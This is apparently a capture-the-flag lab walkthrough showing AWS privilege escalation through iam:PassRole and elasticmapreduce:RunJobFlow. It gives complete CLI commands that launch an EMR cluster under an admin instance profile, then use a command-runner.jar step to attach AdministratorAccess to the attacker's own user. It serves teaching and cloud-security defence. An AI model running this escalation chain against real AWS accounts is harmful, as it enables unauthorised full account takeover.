# Guided Walkthrough: Privilege Escalation via iam:PassRole + elasticmapreduce:RunJobFlow

This scenario demonstrates a privilege escalation vulnerability where a user with `iam:PassRole` and `elasticmapreduce:RunJobFlow` permissions can create an Amazon EMR cluster with an administrative instance profile and use a built-in step executor to run arbitrary AWS CLI commands as the admin role, ultimately granting themselves full administrative access.

Amazon EMR clusters require two IAM roles: a **service role** (trusted by `elasticmapreduce.amazonaws.com`) that manages cluster infrastructure, and a **job flow role / instance profile** (trusted by `ec2.amazonaws.com`) that the EC2 nodes within the cluster assume. When the job flow role has administrative permissions, any code running on cluster nodes -- including EMR steps -- executes with those elevated privileges. AWS provides `command-runner.jar` pre-installed on every EMR node; passing it as the step `Jar` lets you run arbitrary bash commands using those admin credentials.

This is the "PassRole + Compute Service" privilege escalation pattern applied to EMR, similar in structure to the Lambda and Glue variants but with a longer provisioning lead time (5-15 minutes for cluster boot).

## The Challenge

You start as `pl-prod-emr-001-to-admin-starting-user` -- an IAM user with a specific set of permissions: `iam:PassRole` (scoped to the two scenario roles) and `elasticmapreduce:RunJobFlow`. Your goal is to reach effective administrator access in the account.

There is also an IAM role, `pl-prod-emr-001-to-admin-admin-role`, with `AdministratorAccess` attached. This role trusts `ec2.amazonaws.com`, meaning it can be used as an EC2 instance profile -- and therefore as the EMR cluster's JobFlowRole. A second role, `pl-prod-emr-001-to-admin-service-role`, is the EMR service role with `AmazonElasticMapReduceRole` attached and trusts `elasticmapreduce.amazonaws.com`.

Can you weaponize `iam:PassRole` and `elasticmapreduce:RunJobFlow` to make an EMR cluster run an arbitrary command under the admin role?

## Reconnaissance

Confirm your identity and verify that you don't already have admin access.

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:iam::{account_id}:user/pl-prod-emr-001-to-admin-starting-user

aws iam list-users --max-items 1
# AccessDenied -- you are not admin yet
```

Get the account ID and the region -- you will need both to construct ARNs:

```bash
aws sts get-caller-identity --query 'Account' --output text
# {account_id}
```

The role and instance profile names are available from the Terraform outputs. At this point you know you have `iam:PassRole` and `elasticmapreduce:RunJobFlow`. The attack plan: pass the admin role as the cluster's JobFlowRole, pass the service role as the cluster's ServiceRole, and embed a step that runs `aws iam attach-user-policy` via `command-runner.jar`.

## Exploitation

### Step 1: Create the EMR cluster with an escalation step

The key insight is that EMR EC2 nodes automatically assume the instance profile role via IMDS. Any process running on those nodes -- including EMR steps -- inherits the admin role's credentials. `command-runner.jar` is a pre-installed JAR on all EMR nodes that accepts a shell command as its arguments; it acts as a thin wrapper around bash.

```bash
ADMIN_INSTANCE_PROFILE="pl-prod-emr-001-to-admin-admin-instance-profile"
SERVICE_ROLE="pl-prod-emr-001-to-admin-service-role"
STARTING_USER_NAME="pl-prod-emr-001-to-admin-starting-user"
REGION="us-east-1"  # or your deployed region

aws emr create-cluster \
    --region "$REGION" \
    --name "pl-prod-emr-001-to-admin-privesc-cluster" \
    --release-label emr-7.0.0 \
    --applications Name=Hadoop \
    --instance-type m5.xlarge \
    --instance-count 1 \
    --service-role "$SERVICE_ROLE" \
    --ec2-attributes "InstanceProfile=$ADMIN_INSTANCE_PROFILE" \
    --steps '[
      {
        "Name": "Escalate",
        "ActionOnFailure": "TERMINATE_CLUSTER",
        "Type": "CUSTOM_JAR",
        "Jar": "command-runner.jar",
        "Args": ["bash", "-c", "aws iam attach-user-policy --user-name '"$STARTING_USER_NAME"' --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
      }
    ]' \
    --auto-terminate \
    --output json
# {"ClusterId": "j-XXXXXXXXXXXX"}
```

This call succeeds because you have `iam:PassRole` on both roles and `elasticmapreduce:RunJobFlow`. The cluster is now being provisioned. The step has not yet run -- cluster boot takes 5-15 minutes.

### Step 2: Wait for the cluster to complete

EMR cluster provisioning is the slow part of this attack. Poll the cluster state every 30 seconds:

```bash
CLUSTER_ID="j-XXXXXXXXXXXX"  # from the previous step

aws emr describe-cluster \
    --region "$REGION" \
    --cluster-id "$CLUSTER_ID" \
    --query 'Cluster.Status.State' \
    --output text
# STARTING -> BOOTSTRAPPING -> RUNNING -> TERMINATING -> TERMINATED
```

The `--auto-terminate` flag causes EMR to terminate the cluster after the step completes. Wait until the state is `TERMINATED`. If it transitions to `TERMINATED_WITH_ERRORS`, check the step status -- the `iam:attach-user-policy` call may still have succeeded before the cluster was asked to terminate.

### Step 3: Verify the step completed

```bash
aws emr list-steps \
    --region "$REGION" \
    --cluster-id "$CLUSTER_ID" \
    --query 'Steps[0].[Name,Status.State]' \
    --output text
# Escalate    COMPLETED
```

A status of `COMPLETED` confirms `iam:AttachUserPolicy` ran successfully under the admin role.

## Verification

Wait about 15 seconds for the IAM policy change to propagate, then verify using the starting user credentials (not readonly credentials -- verifying with readonly creds would be a false positive since readonly has independent read permissions):

```bash
aws iam list-attached-user-policies \
    --user-name pl-prod-emr-001-to-admin-starting-user \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text
# arn:aws:iam::aws:policy/AdministratorAccess

aws iam list-users --max-items 3
# Successfully returns user list -- you have admin access
```

## Capture the Flag

Admin access isn't the finish line -- the flag is. Every Pathfinding Labs scenario stores a flag in a well-known location, and retrieving it is how you prove the end-to-end attack worked. For `to-admin` scenarios like this one, the flag lives in AWS Systems Manager Parameter Store at a predictable path under `/pathfinding-labs/flags/`. Reading it requires `ssm:GetParameter` on that specific parameter, which the `AdministratorAccess` managed policy now attached to your starting user provides implicitly.

Using the starting user credentials (which, thanks to the previous step, now hold `AdministratorAccess`), read the flag:

```bash
aws ssm get-parameter \
    --name /pathfinding-labs/flags/emr-001-to-admin \
    --query 'Parameter.Value' \
    --output text
# flag{...}  -- your scenario-specific flag value
```

The value printed is the flag you submit to complete the challenge. Its exact contents are deployment-specific (the default ships in `flags.default.yaml` in the repo root; vendors running hosted labs can swap in their own set via `plabs init --flag-file` or `plabs flags import`). The retrieval mechanism and path are identical across every `to-admin` scenario, so this same command works as the final step for any of them -- only the scenario ID in the path changes.

## What Happened

The attack exploited the "PassRole + Compute Service" pattern: `iam:PassRole` let you delegate the admin role to an EMR cluster as its instance profile, and `elasticmapreduce:RunJobFlow` let you define what code runs under that role. Once the cluster booted, its EC2 nodes assumed the admin role via IMDS. The step executor (`command-runner.jar`) ran a bash one-liner that called `iam:AttachUserPolicy` under those admin credentials, permanently granting your starting user `AdministratorAccess`.

In real environments this pattern appears when developers or data engineers are given EMR permissions to run batch processing workloads, but the instance profiles attached to those clusters are not scoped down -- instead they carry `AdministratorAccess` or similarly broad permissions. An attacker who compromises such a user (or finds an overly permissive role that allows EMR cluster creation) can follow exactly this path to full account compromise. The 5-15 minute provisioning delay makes this technique somewhat noisier than Lambda or Glue variants, but it is equally effective and leaves the same footprint.
